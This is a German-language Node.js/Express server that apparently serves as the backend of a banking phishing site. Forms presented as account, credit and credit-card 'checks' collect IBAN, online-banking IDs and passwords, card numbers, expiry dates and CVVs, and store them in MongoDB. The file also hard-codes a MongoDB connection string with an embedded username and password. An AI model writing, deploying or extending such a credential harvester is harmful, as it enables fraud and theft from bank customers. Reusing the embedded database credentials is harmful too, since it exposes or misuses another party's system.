import express from 'express';
import { MongoClient } from 'mongodb';
import { fileURLToPath } from 'url';
import path, { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

// Middleware für das Parsen von JSON und URL-codierten Daten
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB Connection URI und Datenbankname
const uri = "mongodb+srv://johan246:TID0tFov2Y3GZoz6@braunstein.oxtmnmo.mongodb.net/test?retryWrites=true&w=majority&appName=Braunstein";
const client = new MongoClient(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Verbindung zur MongoDB herstellen
async function connectToMongoDB() {
  try {
    await client.connect();
    console.log('Erfolgreich zur MongoDB verbunden');
  } catch (err) {
    console.error('Verbindung zur MongoDB fehlgeschlagen: ', err);
    process.exit(1);
  }
}

connectToMongoDB();

// Statische Dateien (HTML, CSS, JavaScript) bereitstellen
app.use(express.static(path.join(__dirname, 'public')));

// Routen für die Formularverarbeitung

// Indexseite
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Kontoprüfung
app.post('/kontopruefung', async (req, res) => {
  const { kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, OnlineBankingPasswort } = req.body;
  const collection = client.db("test").collection('kontopruefung');

  try {
    const result = await collection.insertOne({ kontoInhaber, iban, bic, bankname, kontonummer, onlineBankingID, OnlineBankingPasswort  });
    console.log('Kontodaten erfolgreich gespeichert:', result.ops[0]);
    res.status(200).redirect('/kontopruefung.html');
  } catch (err) {
    console.error('Fehler beim Speichern der Kontodaten: ', err);
    res.status(500).send('Interner Serverfehler');
  }
});

// Bonitätscheck
app.post('/bonitaetscheck', async (req, res) => {
  const { name, vorname, geburtsdatum, einkommen } = req.body;
  const collection = client.db("test").collection('bonitaetscheck');

  try {
    const result = await collection.insertOne({ name, vorname, geburtsdatum, einkommen });
    console.log('Bonitätsdaten erfolgreich gespeichert:', result.ops[0]);
    res.status(200).redirect('/bonitaetscheck.html');
  } catch (err) {
    console.error('Fehler beim Speichern der Bonitätsdaten: ', err);
    res.status(500).send('Interner Serverfehler');
  }
});

// Kreditkartenprüfung
app.post('/kreditkartenpruefung', async (req, res) => {
  const { kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, OnlineBankingPasswort } = req.body;
  const collection = client.db("test").collection('kreditkartenpruefung');

  try {
    const result = await collection.insertOne({ kartentyp, kartennummer, verfallsdatum, cvv, onlineBankingID, OnlineBankingPasswort });
    console.log('Kreditkartendaten erfolgreich gespeichert:', result.ops[0]);
    res.status(200).redirect('/kreditkartenpruefung.html');
  } catch (err) {
    console.error('Fehler beim Speichern der Kreditkartendaten: ', err);
    res.status(500).send('Interner Serverfehler');
  }
});

// Kontaktformular
app.post('/kontakt', async (req, res) => {
  const { name, email, nachricht } = req.body;
  const collection = client.db("test").collection('kontakt');

  try {
    const result = await collection.insertOne({ name, email, nachricht });
    console.log('Kontaktformulardaten erfolgreich gespeichert:', result.ops[0]);
    res.status(200).redirect('/kontakt.html');
  } catch (err) {
    console.error('Fehler beim Speichern der Kontaktformulardaten: ', err);
    res.status(500).send('Interner Serverfehler');
  }
});

// Fehlerbehandlung für nicht gefundene Routen
app.use((req, res) => {
  res.status(404).send('404 - Seite nicht gefunden');
});

// Server starten
app.listen(port, () => {
  console.log(`Server läuft auf http://localhost:${port}`);
});
